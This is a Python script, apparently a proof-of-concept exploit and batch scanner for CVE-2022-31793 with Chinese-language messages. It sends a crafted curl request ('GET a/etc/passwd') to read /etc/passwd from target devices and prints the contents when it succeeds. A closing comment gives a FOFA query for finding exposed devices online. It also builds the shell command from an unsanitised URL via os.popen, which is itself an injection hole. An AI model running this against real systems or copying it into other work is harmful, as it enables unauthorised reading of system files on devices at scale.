from asyncio.windows_events import NULL
from email import parser
import argparse
import urllib3
import os
urllib3.disable_warnings()

    
def curl(url):
    url = url
    res = os.popen('curl --ignore-content-length -X"GET a/etc/passwd" %s --insecure  --connect-timeout 5' % url).read()

    if res == []:
        print('[x] '+url+" ---连接失败。")
    elif 'root' in res:
        print('[+] '+url+' ---漏洞存在。')
        #for i in res:
        print(res)
    elif '414' in res:
        print('[-] '+url+' ---漏洞不存在。')


if __name__ == "__main__":

    print('-'*70)
    print('CVE-2022-31793  BY luckyZ')
    print('-'*70)
    parser = argparse.ArgumentParser(description='CVE-2022-31793 BY luckyZ',
                                    usage='\n 单目标检测：python3 cve-2022-31793.py -u [scheme]://[host]:[port]\n批量检测：python3 cve-2022-31793.py -f urls.txt\n')

    parser.add_argument('-u',action='store',dest='url',help='目标IP')
    parser.add_argument('-f',action='store',dest='file',help='URL批量目标文件')

    args = parser.parse_args()
    if args.url != '' and args.file is None:
        curl(args.url)
    elif args.file != '' and args.url is None:
        with open(args.file,'r') as f:
            for url in f.readlines():
                url = url.strip('\n').strip(' ')
                curl(url)
    


#fofa:body="Block11.gif"||cert.subject="dsldevice.domain_not_set.invalid"